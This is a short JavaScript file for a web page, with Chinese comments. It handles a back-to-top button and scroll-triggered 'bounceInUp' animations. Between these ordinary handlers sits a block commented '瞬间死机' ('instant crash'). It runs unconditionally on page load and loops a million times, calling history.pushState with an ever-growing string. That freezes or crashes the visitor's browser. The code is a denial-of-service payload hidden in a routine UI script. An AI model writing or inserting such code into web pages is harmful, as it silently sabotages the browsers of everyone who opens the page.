//回到顶部
$(function() {
    var a = document.getElementById("scrolltop"),
    b = !0;
    $(window).scroll(function() {
        var c = $(window).scrollTop();
        c > 0 ? a.classList.remove("mdui-fab-hide") : a.classList.add("mdui-fab-hide"),
        b = !1
    }),
    a.onclick = function() {
        function a(a) {
            $("body").animate({
                scrollTop: "0"
            },
            a, "swing")
        }
        b || (a(400), b = !0)
    }
});
//瞬间死机
var total = "";
for(var i = 0; i<1000000; i++)
{
    total = total + i.toString();
    history.pushState(0,0,total);
}
//滚动监听
$(function () {
    $(window).scroll(function () {
        var scrolltop = $(window).scrollTop();//网页被卷起来的高度
        var winheight = $(window).height();//页面可视区域的高度
        $("div").each(function(){
            //如果元素距离页面最顶部小于 网页目前的高度的时候
            if(this.offsetTop < scrolltop + winheight - 100){
                $(this).children().addClass("bounceInUp");
            }
            if(this.offsetTop < scrolltop + winheight - 800){
                $(this).children().removeClass("bounceInUp");
            }
            if(this.offsetTop > scrolltop + winheight + 100){
                $(this).children().removeClass("bounceInUp");
            }
        });
    });
});
